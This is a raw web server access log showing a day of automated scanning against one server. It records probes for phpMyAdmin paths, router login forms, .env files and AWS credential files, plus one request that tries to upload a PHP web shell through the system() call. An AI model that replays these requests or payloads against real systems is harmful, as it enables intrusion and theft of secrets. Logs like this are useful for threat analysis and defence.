62.33.36.161 - - [04/Feb/2023:04:24:21 -0600] "GET /db/db-admin/index.php?lang=en HTTP/1.1" 301 270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:21 -0600] "GET /mysql/web/index.php?lang=en HTTP/1.1" 301 268 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:21 -0600] "GET /phpMyAdmin_/index.php?lang=en HTTP/1.1" 301 270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:21 -0600] "GET /sql/sqladmin/index.php?lang=en HTTP/1.1" 301 271 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:22 -0600] "GET /phpMyAdmin/index.php?lang=en HTTP/1.1" 301 269 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:22 -0600] "GET /db/websql/index.php?lang=en HTTP/1.1" 301 268 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:22 -0600] "GET /phpmyadmin1/index.php?lang=en HTTP/1.1" 301 270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:22 -0600] "GET /db/phpMyAdmin-4/index.php?lang=en HTTP/1.1" 301 274 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:22 -0600] "GET /php-myadmin/index.php?lang=en HTTP/1.1" 301 270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:23 -0600] "GET /phpmyadmin2019/index.php?lang=en HTTP/1.1" 301 273 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:23 -0600] "GET /mysql/web/index.php?lang=en HTTP/1.1" 301 268 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:23 -0600] "GET /phpmyadmin2021/index.php?lang=en HTTP/1.1" 301 273 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:23 -0600] "GET /sql/phpmyadmin4/index.php?lang=en HTTP/1.1" 301 274 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:23 -0600] "GET /phpMyAdmin-latest-english/index.php?lang=en HTTP/1.1" 301 284 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:24 -0600] "GET /sql/phpMyAdmin/index.php?lang=en HTTP/1.1" 301 273 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:24 -0600] "GET /phpMyAdmin4/index.php?lang=en HTTP/1.1" 301 270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:24 -0600] "GET /administrator/PMA/index.php?lang=en HTTP/1.1" 301 276 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:24 -0600] "GET /phpmyadmin2015/index.php?lang=en HTTP/1.1" 301 273 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:24 -0600] "GET /db/websql/index.php?lang=en HTTP/1.1" 301 268 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:25 -0600] "GET /admin/db/index.php?lang=en HTTP/1.1" 301 267 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:25 -0600] "GET /sql/phpmanager/index.php?lang=en HTTP/1.1" 301 273 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:25 -0600] "GET /mysql/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:25 -0600] "GET /PMA/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:25 -0600] "GET /admin/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:26 -0600] "GET /db/webadmin/index.php?lang=en HTTP/1.1" 301 270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:26 -0600] "GET /php-myadmin/index.php?lang=en HTTP/1.1" 301 270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:26 -0600] "GET /PMA/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:26 -0600] "GET /mysql/pma/index.php?lang=en HTTP/1.1" 301 268 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:26 -0600] "GET /db/websql/index.php?lang=en HTTP/1.1" 301 268 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:26 -0600] "GET /db/phpMyAdmin3/index.php?lang=en HTTP/1.1" 301 273 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:27 -0600] "GET /sql/myadmin/index.php?lang=en HTTP/1.1" 301 270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:27 -0600] "GET /_phpmyadmin_/index.php?lang=en HTTP/1.1" 301 271 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:27 -0600] "GET /1phpmyadmin/index.php?lang=en HTTP/1.1" 301 270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:27 -0600] "GET /administrator/phpmyadmin/index.php?lang=en HTTP/1.1" 301 283 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:27 -0600] "GET /phpmyadmin5/index.php?lang=en HTTP/1.1" 301 270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:28 -0600] "GET /administrator/pma/index.php?lang=en HTTP/1.1" 301 276 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:28 -0600] "GET /phpMyAdmin5/index.php?lang=en HTTP/1.1" 301 270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:28 -0600] "GET /db/myadmin/index.php?lang=en HTTP/1.1" 301 269 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:28 -0600] "GET /phpMyAdmin1/index.php?lang=en HTTP/1.1" 301 270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:28 -0600] "GET /__phpmyadmin/index.php?lang=en HTTP/1.1" 301 271 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
143.110.222.166 - - [04/Feb/2023:04:48:26 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
79.137.202.2 - - [04/Feb/2023:05:08:04 -0600] "CONNECT google.com:443 HTTP/1.1" 301 241 "-" "Go-http-client/1.1"
185.246.220.98 - - [04/Feb/2023:05:34:53 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 264 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
88.247.92.131 - - [04/Feb/2023:05:48:10 -0600] "GET / HTTP/1.1" 301 241 "-" "-"
128.1.248.42 - - [04/Feb/2023:06:16:10 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
179.43.177.242 - - [04/Feb/2023:06:41:32 -0600] "GET / HTTP/1.1" 301 241 "-" "Hello World"
2600:1f10:45de:bc00:7e49:a087:3e37:69e2 - - [04/Feb/2023:06:45:26 -0600] "GET /wp-22.php?sfilename=1975.php&sfilecontent=%3C?=echo%20system($_GET%5B%22ll%22%5D;%20);&supfiles=1975.php HTTP/1.1" 301 353 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)"
107.170.241.14 - - [04/Feb/2023:07:22:03 -0600] "MGLNDD_194.195.210.97_80\n" 400 226 "-" "-"
143.110.222.166 - - [04/Feb/2023:07:22:15 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
166.62.103.104 - - [04/Feb/2023:07:36:10 -0600] "GET /wp-login.php HTTP/1.1" 301 253 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96"
193.32.162.159 - - [04/Feb/2023:07:53:10 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
184.105.247.195 - - [04/Feb/2023:07:56:56 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; rv:103.0) Gecko/20100101 Firefox/103.0"
154.89.5.107 - - [04/Feb/2023:07:58:39 -0600] "GET / HTTP/1.1" 301 241 "-" "-"
184.105.247.195 - - [04/Feb/2023:07:58:41 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0"
184.105.247.195 - - [04/Feb/2023:07:59:00 -0600] "GET /favicon.ico HTTP/1.1" 301 252 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:105.0) Gecko/20100101 Firefox/105.0"
143.110.222.166 - - [04/Feb/2023:08:05:14 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
143.110.222.166 - - [04/Feb/2023:08:23:07 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
3.235.198.47 - - [04/Feb/2023:08:36:21 -0600] "\x16\x03\x01" 400 226 "-" "-"
3.235.198.47 - - [04/Feb/2023:08:36:21 -0600] "GET /robots.txt HTTP/1.1" 301 251 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
3.235.198.47 - - [04/Feb/2023:08:36:21 -0600] "\x16\x03\x01" 400 226 "-" "-"
3.235.198.47 - - [04/Feb/2023:08:36:21 -0600] "\x16\x03\x01" 400 226 "-" "-"
3.235.198.47 - - [04/Feb/2023:08:36:21 -0600] "\x16\x03\x01" 400 226 "-" "-"
3.235.198.47 - - [04/Feb/2023:08:36:21 -0600] "GET /gate.php HTTP/1.1" 301 249 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
3.235.198.47 - - [04/Feb/2023:08:36:21 -0600] "GET /99vt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
3.235.198.47 - - [04/Feb/2023:08:36:21 -0600] "\x16\x03\x01" 400 226 "-" "-"
3.235.198.47 - - [04/Feb/2023:08:36:21 -0600] "GET /aaaaaaaaaaaaaaaaaaaaaaaaaqr HTTP/1.1" 301 268 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
3.235.198.47 - - [04/Feb/2023:08:36:21 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
3.235.198.47 - - [04/Feb/2023:08:36:21 -0600] "GET /robots.txt HTTP/1.1" 301 251 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
45.79.181.251 - - [04/Feb/2023:08:47:25 -0600] "\x16\x03\x01" 400 226 "-" "-"
90.151.171.108 - - [04/Feb/2023:09:02:57 -0600] "CONNECT v4.ident.me:443 HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
90.151.171.108 - - [04/Feb/2023:09:03:07 -0600] "GET http://v4.ident.me?Z71823167623Q1 HTTP/1.1" 301 256 "https://google.com/" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
203.176.134.227 - - [04/Feb/2023:09:16:21 -0600] "GET /.env HTTP/1.1" 301 245 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
143.110.222.166 - - [04/Feb/2023:09:24:59 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
240b:4005:18:3b00:88cd:89dd:7daf:c403 - - [04/Feb/2023:09:36:05 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
240b:4005:18:3b00:88cd:89dd:7daf:c403 - - [04/Feb/2023:09:36:07 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
240b:4005:18:3b00:88cd:89dd:7daf:c403 - - [04/Feb/2023:09:36:11 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
240b:4005:18:3b00:88cd:89dd:7daf:c403 - - [04/Feb/2023:09:38:42 -0600] "\x16\x03\x01" 400 226 "-" "-"
240b:4005:18:3b00:88cd:89dd:7daf:c403 - - [04/Feb/2023:09:38:45 -0600] "\x16\x03\x01" 400 226 "-" "-"
240b:4005:18:3b00:88cd:89dd:7daf:c403 - - [04/Feb/2023:09:38:51 -0600] "\x16\x03\x01" 400 226 "-" "-"
185.246.220.98 - - [04/Feb/2023:09:41:18 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 264 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
143.110.222.166 - - [04/Feb/2023:10:08:29 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
193.32.162.159 - - [04/Feb/2023:10:24:52 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
180.149.125.159 - - [04/Feb/2023:10:26:43 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
130.61.143.194 - - [04/Feb/2023:10:32:26 -0600] "GET /wp-login.php HTTP/1.1" 301 253 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96"
42.83.147.34 - - [04/Feb/2023:10:47:52 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)Chrome/74.0.3729.169 Safari/537.36"
20.102.43.87 - - [04/Feb/2023:10:54:21 -0600] "GET /local/ HTTP/1.1" 301 247 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
143.110.222.166 - - [04/Feb/2023:11:04:59 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
193.32.162.159 - - [04/Feb/2023:11:38:25 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
179.43.177.242 - - [04/Feb/2023:11:40:10 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 264 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
193.32.162.159 - - [04/Feb/2023:11:48:43 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
62.1.246.184 - - [04/Feb/2023:11:57:00 -0600] "GET / HTTP/1.1" 301 241 "-" "Hello World"
20.172.164.82 - - [04/Feb/2023:11:59:57 -0600] "GET /.env HTTP/1.1" 301 245 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.172.164.82 - - [04/Feb/2023:11:59:57 -0600] "POST / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.110.222.166 - - [04/Feb/2023:12:05:55 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
65.157.23.94 - - [04/Feb/2023:12:16:42 -0600] "GET /.env HTTP/1.1" 301 245 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
65.157.23.94 - - [04/Feb/2023:12:16:42 -0600] "POST / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
92.118.39.82 - - [04/Feb/2023:12:23:19 -0600] "GET / HTTP/1.1" 301 241 "-" "-"
185.246.220.98 - - [04/Feb/2023:12:47:48 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
5.161.189.6 - - [04/Feb/2023:13:02:43 -0600] "GET /wp-login.php HTTP/1.1" 301 253 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763"
143.110.222.166 - - [04/Feb/2023:13:09:42 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
194.38.20.161 - - [04/Feb/2023:13:11:45 -0600] "GET /index.php?option=com_myblog&task=ajaxupload HTTP/1.1" 301 288 "-" "ALittle Client"
185.83.146.154 - - [04/Feb/2023:13:20:07 -0600] "GET /.env HTTP/1.1" 301 245 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.83.146.154 - - [04/Feb/2023:13:20:07 -0600] "POST /.env HTTP/1.1" 301 245 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.83.146.154 - - [04/Feb/2023:13:20:08 -0600] "GET /.aws/credentials HTTP/1.1" 301 257 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.83.146.154 - - [04/Feb/2023:13:20:09 -0600] "POST /.aws/credentials HTTP/1.1" 301 257 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.83.146.154 - - [04/Feb/2023:13:20:10 -0600] "GET /.aws/config HTTP/1.1" 301 252 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.83.146.154 - - [04/Feb/2023:13:20:11 -0600] "POST /.aws/config HTTP/1.1" 301 252 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.83.146.154 - - [04/Feb/2023:13:20:11 -0600] "GET /aws/credentials HTTP/1.1" 301 256 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.83.146.154 - - [04/Feb/2023:13:20:12 -0600] "POST /aws/credentials HTTP/1.1" 301 256 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.83.146.154 - - [04/Feb/2023:13:20:12 -0600] "GET /credentials HTTP/1.1" 301 252 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.83.146.154 - - [04/Feb/2023:13:20:15 -0600] "POST /credentials HTTP/1.1" 301 252 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.83.146.154 - - [04/Feb/2023:13:20:16 -0600] "GET /test.php HTTP/1.1" 301 249 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.83.146.154 - - [04/Feb/2023:13:20:17 -0600] "POST /test.php HTTP/1.1" 301 249 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.83.146.154 - - [04/Feb/2023:13:20:17 -0600] "GET /laravel/.env HTTP/1.1" 301 253 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.83.146.154 - - [04/Feb/2023:13:20:19 -0600] "POST /laravel/.env HTTP/1.1" 301 253 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.83.146.154 - - [04/Feb/2023:13:20:19 -0600] "GET /demo/.env HTTP/1.1" 301 250 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.83.146.154 - - [04/Feb/2023:13:20:20 -0600] "POST /demo/.env HTTP/1.1" 301 250 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.83.146.154 - - [04/Feb/2023:13:20:21 -0600] "GET /web/.env HTTP/1.1" 301 249 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.83.146.154 - - [04/Feb/2023:13:20:22 -0600] "POST /web/.env HTTP/1.1" 301 249 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
179.43.177.242 - - [04/Feb/2023:13:23:52 -0600] "GET / HTTP/1.1" 301 241 "-" "Hello World"
